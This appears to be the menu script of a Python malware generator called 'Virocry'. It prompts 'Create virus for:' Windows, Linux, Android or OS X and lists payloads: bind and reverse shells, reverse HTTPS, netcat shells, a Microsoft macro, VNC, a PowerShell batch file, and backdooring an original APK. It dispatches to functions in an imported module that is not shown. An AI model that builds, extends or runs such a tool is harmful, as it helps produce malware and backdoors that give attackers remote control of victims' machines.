import colorama
from colorama import Fore, Style
import os
from shell import *

banner = '''
 ██▒   █▓ ██▓ ██▀███   ▄████▄   ██▀███ ▓██   ██▓
▓██░   █▒▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
 ▓██  █▒░▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
  ▒██ █░░░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
   ▒▀█░  ░██░░██▓ ▒██▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
   ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
   ░ ░░   ▒ ░  ░▒ ░ ▒░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
     ░░   ▒ ░  ░░   ░ ░          ░░   ░ ▒ ▒ ░░  
      ░   ░     ░     ░ ░         ░     ░ ░     
     ░                ░                 ░ ░     
                                     by Elieren
'''

print(Fore.GREEN + banner + Style.RESET_ALL)

print(Fore.YELLOW + 'Create virus for:')

print('1) Windows')
print('2) linux')
print('3) Android')
print('4) OS X')

platform = str(input(': '))
os.system('clear')

if platform == '1':
    print('[1] Bind Shell')
    print('[2] Reverse Shell')
    print('[3] Reverse HTTPS')
    print('[4] Bind Shell (Netcat)')
    print('[5] Reverse Shell (Netcat)')
    print('[6] Microsoft macro')
    print('[7] Vnc')
    print('[8] PowerShell (bat)')
    nam = int(input(': '))
    windows(nam)

elif platform == '2':
    print('[1] Reverse Shell (elf)')
    print('[2] Reverse Shell (Python)')
    print('[3] Bind Shell (elf)')
    nam = int(input(': '))
    linux(nam)

elif platform == '3':
    print('[1] Create apk')
    print('[2] Backdoor apk original (gui)')
    nam = int(input(': '))
    android(nam)

elif platform == '4':
    print('[1] Reverse Shell')
    print('[2] Bind Shell')
    nam = int(input(': '))
    mac(nam)
